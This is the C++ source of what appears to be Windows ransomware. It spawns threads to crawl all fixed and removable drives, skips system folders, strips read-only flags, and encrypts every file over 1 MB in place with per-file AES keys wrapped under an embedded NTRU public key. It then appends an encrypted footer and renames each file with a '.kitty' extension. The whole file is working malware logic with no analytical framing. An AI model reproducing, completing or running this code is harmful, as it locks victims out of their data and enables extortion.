#include <windows.h>
#include <shlwapi.h>
#include <vector>
#include <string>

#include "aesMbedTls.hpp"
#include "ntru.hpp"
#include "randomMbedTls.hpp"
#include "..\enc-struct.h"
#include "..\crc32\crc32.h"

#ifdef _DEBUG
#include "..\new-public-ntru-key-debug.h"
#else
#include "..\new-public-ntru-key-release.h"
#endif

#pragma comment(lib, "shlwapi.lib")

#define _FILES_OPENED_MAX_COUNT_ 200
#define _SKIP_FILE_SIZE_        (1024 * 1024)

#pragma pack(push, 1)
typedef struct _config_params {
    DWORD configSignature;
    ULONGLONG blockSize;
    ULONGLONG limitFileSizeEncrypt;
    bool bCalculateCrc32;
    bool bFullFileEncrypt;
    bool bEncryptFileBlocks;
} config_params;
#pragma pack(pop)

config_params default_parameters = {
    0xAAEECCD0,
    DEFAULT_BLOCK_SIZE,
    0,
    true,
    false,
    true,
};

NTrueDrbg g_drbg;

HANDLE h_Port = nullptr;
volatile ULONG filesOpened = 0;
bool g_globalStop = false;

#pragma pack(push, 1)
typedef struct _enc_end_of_file_ntru {
    byte ntru_encrypted[sizeof(ntru_public_bytes)];
    uint16_t cipherLen;
    DWORD dwEncryptedFlag;
} enc_end_of_file_ntru;
#pragma pack(pop)

// ======================= 异步读写处理 =======================
bool read_next_block(over_struct* o, LONGLONG offset, int operation = operation_read) {
    LARGE_INTEGER li; li.QuadPart = offset;
    o->operation = operation;
    o->overlapped.Offset = li.LowPart;
    o->overlapped.OffsetHigh = li.HighPart;
    return ReadFile(o->hFile, o->tempbuff, sizeof(o->tempbuff), nullptr, (LPOVERLAPPED)o) ||
           GetLastError() == ERROR_IO_PENDING;
}

bool write_block(over_struct* o, LONGLONG offset, char* buff, DWORD size, int operation_type = operation_write) {
    if (size > sizeof(o->tempbuff)) return false;
    LARGE_INTEGER li; li.QuadPart = offset;
    o->operation = operation_type;
    o->overlapped.Offset = li.LowPart;
    o->overlapped.OffsetHigh = li.HighPart;
    memcpy(o->tempbuff, buff, size);
    return WriteFile(o->hFile, o->tempbuff, size, nullptr, (LPOVERLAPPED)o) ||
           GetLastError() == ERROR_IO_PENDING;
}

void close_file(over_struct* s) {
    CancelIo(s->hFile);
    CloseHandle(s->hFile);
    delete (AES128MbedTls*)s->aes_ctx;
    delete s;
    InterlockedDecrement(&filesOpened);
}

DWORD WINAPI ReadWritePoolThread(LPVOID) {
    DWORD bytes; over_struct* str;
    while (!g_globalStop) {
        if (!GetQueuedCompletionStatus(h_Port, &bytes, nullptr, (LPOVERLAPPED*)&str, 5000))
            continue;

        if (!str) continue;

        switch (str->operation) {
            case operation_read_check_encrypted:
                if (bytes != sizeof(enc_end_of_file_ntru) ||
                    ((enc_end_of_file_ntru*)str->tempbuff)->dwEncryptedFlag != ENCRYPTED_FILE_FLAG) {
                    read_next_block(str, 0);
                } else {
                    close_file(str);
                }
                break;

            case operation_read: {
                ULONGLONG current_offset = str->currentBlock * str->encHeader.blockSize;
                ULONGLONG next_offset;

                if (str->encHeader.encType & ENCTYPE_RANDOM_BLOCKS)
                    str->currentBlock += 1 + Random::Get(str->StepRandSeedRuntime, str->encHeader.StepRandMax);
                else
                    str->currentBlock += 1;
                next_offset = str->currentBlock * str->encHeader.blockSize;

                DWORD encrypt_size = (bytes < str->encHeader.blockSize || next_offset >= str->fileSize) ?
                                     ALIGNUP(bytes, AES_BLOCKLEN) : str->encHeader.blockSize;

                if (str->encHeader.encType & ENCTYPE_USE_CRC32 && bytes < str->encHeader.blockSize)
                    str->encHeader.endBlockCrc32 = xcrc32(str->tempbuff, encrypt_size, 0);

                ((AES128MbedTls*)str->aes_ctx)->Encrypt(str->tempbuff, str->outputbuff, encrypt_size);
                write_block(str, current_offset, (char*)str->outputbuff, encrypt_size, operation_write);
                break;
            }

            case operation_write:
                if ((str->encHeader.encType & ENCTYPE_LIMIT_FILE_SIZE) &&
                    (str->currentBlock * str->encHeader.blockSize) >= str->encHeader.qwMaxEnctyptionSize) {
                    str->operation = operation_write_eof;
                    PostQueuedCompletionStatus(h_Port, 0, 0, (LPOVERLAPPED)str);
                } else {
                    read_next_block(str, str->currentBlock * str->encHeader.blockSize);
                }
                break;

            case operation_write_eof: {
                NTRUEncrypt256 ntru;
                ntru.SetPublicKey(ntru_public_bytes, sizeof(ntru_public_bytes));

                enc_end_of_file_ntru eof = {0};
                eof.dwEncryptedFlag = ENCRYPTED_FILE_FLAG;
                uint16_t outLen = sizeof(eof.ntru_encrypted);

                ntru.Encrypt(&g_drbg, (uint8_t*)&str->encHeader, sizeof(str->encHeader),
                            eof.ntru_encrypted, &outLen);
                eof.cipherLen = outLen;

                LARGE_INTEGER fsize;
                GetFileSizeEx(str->hFile, &fsize);
                write_block(str, fsize.QuadPart, (char*)&eof, sizeof(eof), operation_write_closehandle);
                break;
            }

            case operation_write_closehandle: {
                std::wstring oldPath = str->wFullFilePath;
                close_file(str);

                std::wstring newPath = oldPath + L".kitty";
                MoveFile(oldPath.c_str(), newPath.c_str());
                break;
            }
        }
    }
    return 0;
}

// ======================= 文件加密入口 =======================
void EncryptFileIOCP(const std::wstring& filepath) {
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER li;
    if (!GetFileSizeEx(hFile, &li) || li.QuadPart <= _SKIP_FILE_SIZE_) {
        CloseHandle(hFile);
        return;
    }

    if (!CreateIoCompletionPort(hFile, h_Port, 0, 0)) {
        CloseHandle(hFile);
        return;
    }

    auto o = new over_struct();
    o->hFile = hFile;
    o->wFullFilePath = filepath;
    o->fileSize = li.QuadPart;

    o->encHeader.dwMagic = ENCRYPTION_MAGIC;
    o->encHeader.qwOriginalFileSize = li.QuadPart;
    o->encHeader.blockSize = sizeof(o->tempbuff);

    o->encHeader.encType = 0;
    if (default_parameters.bFullFileEncrypt) o->encHeader.encType |= ENCTYPE_FULL_FILE;
    else if (default_parameters.bEncryptFileBlocks) {
        DWORD seed = GetTickCount();
        o->encHeader.encType |= ENCTYPE_RANDOM_BLOCKS;
        o->encHeader.StepRandSeed = Random::Get(seed, 0xFFFFFFFF);
        o->StepRandSeedRuntime = o->encHeader.StepRandSeed;
        o->encHeader.StepRandMax = 5;
    }
    if (default_parameters.bCalculateCrc32) o->encHeader.encType |= ENCTYPE_USE_CRC32;
    if (default_parameters.limitFileSizeEncrypt) {
        o->encHeader.encType |= ENCTYPE_LIMIT_FILE_SIZE;
        o->encHeader.qwMaxEnctyptionSize = default_parameters.limitFileSizeEncrypt;
    }

    o->aes_ctx = new AES128MbedTls();
    ((AES128MbedTls*)o->aes_ctx)->GenKeyIv(MBEDTLS_AES_ENCRYPT);
    ((AES128MbedTls*)o->aes_ctx)->CopyKeyIv(o->encHeader.aes_key, o->encHeader.aes_iv);

    InterlockedIncrement(&filesOpened);

    if (li.QuadPart < sizeof(enc_end_of_file_ntru))
        read_next_block(o, 0);
    else
        read_next_block(o, li.QuadPart - sizeof(enc_end_of_file_ntru), operation_read_check_encrypted);
}

// ======================= 文件搜索 =======================
const wchar_t* blackFolders[] = { L"programdata", L"$recycle.bin", L"program files", L"windows" };
const wchar_t* blackFiles[] = { L"ntldr", L"pagefile.sys", L"desktop.ini", L"thumbs.db" };

void SearchFolder(const std::wstring& path) {
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((path + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.cFileName[0] == L'.') continue;

        std::wstring fullPath = path + L"\\" + fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            bool skip = false;
            for (auto bf : blackFolders)
                if (StrStrIW(fd.cFileName, bf)) { skip = true; break; }
            if (!skip) SearchFolder(fullPath);
        } else {
            bool skip = false;
            for (auto bf : blackFiles)
                if (StrStrIW(fd.cFileName, bf)) { skip = true; break; }
            if (skip) continue;

            while (filesOpened >= _FILES_OPENED_MAX_COUNT_) Sleep(1);
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
                SetFileAttributesW(fullPath.c_str(), fd.dwFileAttributes & ~FILE_ATTRIBUTE_READONLY);

            EncryptFileIOCP(fullPath);
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

DWORD WINAPI DriveSearchThread(LPVOID p) {
    SearchFolder(*(std::wstring*)p);
    delete (std::wstring*)p;
    return 0;
}

void SearchDrives() {
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 32; ++i) {
        if (drives & 1) {
            wchar_t root[] = { L'A' + i, L':', L'\\', 0 };
            UINT type = GetDriveTypeW(root);
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                CreateThread(nullptr, 0, DriveSearchThread, new std::wstring(root), 0, nullptr);
            }
        }
        drives >>= 1;
    }
}

// ======================= 主函数 =======================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD threadCount = si.dwNumberOfProcessors * 2;

    h_Port = CreateIoCompletionPort(INVALID_HANDLE_VALUE, nullptr, 0, threadCount);
    if (!h_Port) return 1;

    std::vector<HANDLE> workers;
    for (DWORD i = 0; i < threadCount; ++i)
        workers.push_back(CreateThread(nullptr, 0, ReadWritePoolThread, nullptr, 0, nullptr));

    SearchDrives();

    while (filesOpened > 0) Sleep(1000);
    g_globalStop = true;

    WaitForMultipleObjects(workers.size(), workers.data(), TRUE, INFINITE);
    for (auto h : workers) CloseHandle(h);
    CloseHandle(h_Port);

    return 0;
}